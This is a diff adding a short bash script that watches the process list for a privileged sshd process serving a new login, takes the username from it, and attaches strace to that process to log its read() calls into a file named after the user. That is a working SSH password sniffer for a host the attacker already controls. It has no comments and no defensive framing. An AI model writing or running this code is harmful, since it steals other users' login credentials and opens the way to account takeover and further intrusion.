@@ -1,0 +1,21 @@
+  function log_pass(){
+    ssh_pid=`echo $has_fish | awk '{print $2}'`
+    strace -e trace=read -p $ssh_pid 2>&1 | grep 'read(6,' > pass_$username
+}
+
+
+function scan(){
+    while :; do
+        has_fish=`ps aux | grep ssh | grep priv` &>/dev/null
+        if [ ! -z "$has_fish" ]; then
+            username=`echo $has_fish | awk '{print $12}'`
+            if [ "$username" == "unknown" ]; then
+                continue
+            else
+                break
+            fi
+        fi
+    done
+}
+scan
+log_pass $username
